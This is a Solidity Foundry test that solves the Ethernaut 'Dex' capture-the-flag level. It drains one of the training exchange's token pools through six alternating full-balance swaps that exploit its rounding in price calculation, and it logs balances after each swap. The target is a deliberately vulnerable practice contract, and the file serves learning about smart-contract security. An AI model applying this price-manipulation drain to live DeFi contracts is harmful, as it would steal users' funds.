// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {DexFactory} from "../src/factories/DexFactory.sol";
import {Dex, SwappableToken} from "../src/levels/Dex.sol";

import "forge-std/console.sol";

contract DexTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        DexFactory factory = new DexFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveDex() public {
        Dex dex = Dex(payable(levelAddress));
        SwappableToken token1 = SwappableToken(payable(dex.token1()));
        SwappableToken token2 = SwappableToken(payable(dex.token2()));

        // [START]

        vm.startPrank(address(this));
        // Approve all tokens
        dex.approve(address(dex), type(uint256).max);

        // Swap
        dex.swap(address(token1), address(token2), dex.balanceOf(address(token1), address(this)));
        debubPrint(dex, 1);
        dex.swap(address(token2), address(token1), dex.balanceOf(address(token2), address(this)));
        debubPrint(dex, 2);
        dex.swap(address(token1), address(token2), dex.balanceOf(address(token1), address(this)));
        debubPrint(dex, 3);
        dex.swap(address(token2), address(token1), dex.balanceOf(address(token2), address(this)));
        debubPrint(dex, 4);
        dex.swap(address(token1), address(token2), dex.balanceOf(address(token1), address(this)));
        debubPrint(dex, 5);
        dex.swap(address(token2), address(token1), 45);
        debubPrint(dex, 6);

        vm.stopPrank();

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }

    function debubPrint(Dex dex, uint256 swapTimes) private view {
        console.log("Swap times: ", swapTimes);
        console.log("DEX token1: ", dex.balanceOf(dex.token1(), address(dex)));
        console.log("DEX token2: ", dex.balanceOf(dex.token2(), address(dex)));
        console.log("Player token1: ", dex.balanceOf(dex.token1(), address(this)));
        console.log("Player token2: ", dex.balanceOf(dex.token2(), address(this)));
        console.log("------------------------");
    }
}
